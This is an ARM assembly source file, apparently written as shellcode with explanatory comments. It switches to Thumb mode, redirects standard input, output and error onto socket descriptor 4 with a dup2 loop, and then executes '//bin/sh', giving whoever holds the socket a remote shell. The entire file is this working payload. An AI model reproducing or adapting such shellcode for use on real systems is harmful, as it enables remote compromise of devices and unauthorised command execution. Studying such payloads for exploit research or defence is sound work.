.section .text
.global _start

_start:
    .code 32              //
    add     r3, pc, #1    // This whole section is for "Thumb Mode"
    bx      r3            //
    .code 16              //

    // dup2 stdin, stdout, stderr to socket fd = 4
    mov r0, #4       // socket fd
    sub r1, r1, r1   // 0 <= fd <= 2
    
    dup2_loop:
    mov r7, #63     // dup3(socket, fd)
    svc 1
    
    add r1, r1, #1
    cmp r1, #3       // fd < 3
    bne dup2_loop

    mov     r0, pc        // We place the address of pc in r0
    add     r0, #10       // and add 10 to it (which then makes it point to //bin/sh)
    
    str     r0, [sp, #4]  // we place it on the stack  (in case we need it again)

    add     r1, sp, #4    // we move what was on the stack to r1

    sub     r2, r2, r2    // we subtract r2 from itself (which is the same as placing 0 in r2)

    mov     r7, #11       // syscall execve in r7
    svc     1             // we execute

.ascii "//bin/sh"
